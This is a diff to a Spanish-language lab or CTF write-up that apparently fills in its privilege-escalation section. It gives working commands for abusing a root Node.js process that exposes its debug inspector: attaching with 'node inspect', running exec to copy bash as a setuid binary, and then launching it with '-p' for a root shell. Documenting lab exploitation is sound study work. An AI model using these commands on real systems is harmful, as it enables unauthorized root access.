@@ -67,16 +67,22 @@ c22002fee26e397a94ead78fb8587957
 ## 4. Privilege Escalation (Escalada de Privilegios)
 
 ### Enumeración Interna
-- 
+- vemos los procesos en segundo pplano de cada uno de los usuarios y nos damos cuenta que hay un proceso de node con `--inspect=127.0.0.1:9229` Esto activa el **inspector de Node.js**, una herramienta de depuración que permite conectarse y ejecutar código JavaScript en ese proceso.
 
 ### Explotación Local
-1. 
-2. 
-3. 
+1.  utilizamos este comando: `node inspect 127.0.0.1:9229` para conectarnos a esa shell
+2. nos conectamos y tenemos acceso a al inspector del proceso Node.js que corre como root.
+3. podemos ejecutar codigo javascript en esa consola
 
 ### Ejecución
 ```bash
+exec("cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash")
+```
 
+luego de salir de esa consola, ejecutamos esto para subir privilegios
+
+```bash
+/tmp/rootbash -p
 ```
 
 **Prueba de acceso (Root/SYSTEM Flag):**
@@ -85,14 +91,3 @@ c22002fee26e397a94ead78fb8587957
 ```
 
 ---
-
-## 5. Post-Exploitation & Clean Up
-- [ ] 
-- [ ] 
-- [ ] 
-
----
-
-## Remediation (Mitigaciones)
-- **Acceso inicial:** 
-- **Escalada:**
